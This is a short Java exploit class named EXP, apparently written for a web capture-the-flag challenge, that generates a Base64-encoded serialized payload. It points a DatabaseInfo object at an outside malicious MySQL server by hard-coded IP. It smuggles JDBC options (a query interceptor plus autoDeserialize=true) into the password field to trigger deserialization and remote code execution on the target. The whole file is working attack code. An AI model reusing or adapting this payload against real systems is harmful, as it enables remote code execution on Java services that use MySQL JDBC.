package gdufs.challenge.web;

import gdufs.challenge.web.invocation.InfoInvocationHandler;
import gdufs.challenge.web.model.DatabaseInfo;
import gdufs.challenge.web.model.Info;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.util.Base64;

/**
 * @author zeroc
 * @date 2023/1/4 23:18
 */
public class EXP {
    public static void main(String[] args) throws Exception {
        // 构造连接恶意MySQL服务器的DatabaseInfo对象
        DatabaseInfo databaseinfo = new DatabaseInfo();
        databaseinfo.setHost("82.157.252.61");
        databaseinfo.setPort("3307");
        databaseinfo.setUsername("root");
        databaseinfo.setPassword("123456&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true");
        // 初始化一个InfoInvocationHandler对象
        InfoInvocationHandler handler = new InfoInvocationHandler(databaseinfo);
        // 对该对象进行动态代理
        Info info = (Info) Proxy.newProxyInstance(databaseinfo.getClass().getClassLoader(), databaseinfo.getClass().getInterfaces(), handler);
        // 进行序列化并输出payload
        ByteArrayOutputStream payload = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(payload)) {
            oos.writeObject(info);
            System.out.println(Base64.getEncoder().encodeToString(payload.toByteArray()));
        }
    }
}
